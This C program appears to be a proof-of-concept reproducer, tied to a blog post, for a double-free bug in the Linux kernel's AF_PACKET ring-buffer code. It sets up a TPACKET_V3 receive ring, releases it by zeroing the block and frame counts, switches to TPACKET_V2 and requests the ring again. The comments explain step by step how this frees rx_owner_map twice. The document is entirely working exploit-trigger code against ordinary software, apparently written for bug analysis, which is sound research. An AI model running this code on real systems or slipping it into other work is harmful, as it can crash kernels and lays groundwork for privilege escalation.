// https://mpdesouza.com/blog/from-zero-to-double-free/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>

int sock;

struct ring {
	union {
		struct tpacket_req  req;
		struct tpacket_req3 req3;
	};
};

static void set_ver(int ver)
{
	if (setsockopt(sock, SOL_PACKET, PACKET_VERSION, &ver, sizeof(ver)) == -1) {
		perror("setsockopt");
		fprintf(stderr, "Cannot set sock to ver %d\n", ver + 1);
		exit(1);
	}
}

static void __v3_fill(struct ring *ring)
{
	ring->req3.tp_retire_blk_tov = 64;
	ring->req3.tp_sizeof_priv = 0;
	ring->req3.tp_feature_req_word = TP_FT_REQ_FILL_RXHASH;

	ring->req3.tp_block_size = getpagesize() << 2;
	ring->req3.tp_frame_size = TPACKET_ALIGNMENT << 7;
	ring->req3.tp_block_nr = 256;

	ring->req3.tp_frame_nr = ring->req3.tp_block_size /
				 ring->req3.tp_frame_size *
				 ring->req3.tp_block_nr;
}

static void setup_ring(int mess)
{
	struct ring ring;

	__v3_fill(&ring);

	/*
	 * First time we call setup_ring, using TPACKET_V3, we send the req3
	 * as populated by __v3_fill. In the next calls, we zero two members of
	 * the struct, simulating a 'close' of the socket. This makes afpacket
	 * module to free pg_vec.
	 *
	 * tpacket_v3 does not allocate rx_owner_map, but instead it sets
	 * prb_bdqc, but both are define in a union.
	 */
	if (mess) {
		ring.req3.tp_block_nr = 0;
		ring.req3.tp_frame_nr= 0;
	}
	if (setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &ring.req3,
			 sizeof(ring.req3)) == -1) {
		perror("setsockopt");
		exit(1);
	}
}

int main(void)
{
	sock = socket(PF_PACKET, SOCK_RAW, 0);
	if (sock == -1) {
		perror("socket");
		exit(1);
	}

	set_ver(TPACKET_V3);

	/* Send complete req3 data */
	setup_ring(0);
	/*
	 * Pass tp_block_nr and tp_frame_nr, releases pg_vec, and rb->rw_owner_map
	 * is freed
	 * */
	setup_ring(1);

	/* With pg_vec released, we can change the socket version to TPACKET_V2 */
	set_ver(TPACKET_V2);

	/*
	 * With V2, we send again the tp_block_nr/tp_frame_nr zeroed, so
	 * afpacket does not try to allocate a pg_vec of rx_owner_map and goes
	 * directly to the cleaning part. For V1/V2, it swaps the current
	 * allocated rw_owner_map (which wasn't allocated this time) with the
	 * previously stored rw_owner_map (freed in the second setup_ring call
	 * above).
	 *
	 * Now, double free on the way!
	 */
	setup_ring(1);

	return 0;
}
